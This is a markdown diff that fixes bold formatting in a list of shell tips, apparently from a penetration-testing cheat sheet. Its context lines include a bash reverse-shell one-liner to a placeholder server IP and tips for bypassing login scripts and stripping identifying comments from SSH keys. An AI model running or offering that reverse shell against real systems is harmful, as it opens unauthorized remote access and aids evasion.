@@ -289,7 +289,7 @@ Replace `xx.xx.xx.xx` with your server ip.
 $ bash -i >& /dev/tcp/xx.xx.xx.xx/666 0>&1
 ```
 
-**23. SSH with different shell
+**23. SSH with different shell**
 
 Bypass events that exist in login scripts such as `.profile` and `.bashrc`.
 
@@ -298,7 +298,7 @@ $ ssh user@server sh
 
 ```
 
-**24. Strip SSH key comment field.
+**24. Strip SSH key comment field.**
 
 `ssh-keygen` automatically fills this field with local user and host, and can be recorded during connection.
 
@@ -308,7 +308,7 @@ Command strips comment field from both private and public keys.
 $ ssh-keygen -c -C "redacted" -f ~/.ssh/id_rsa
 ```
 
-**25. Get a root shell in Docker container.
+**25. Get a root shell in Docker container.**
 
 If the container is already running:
 
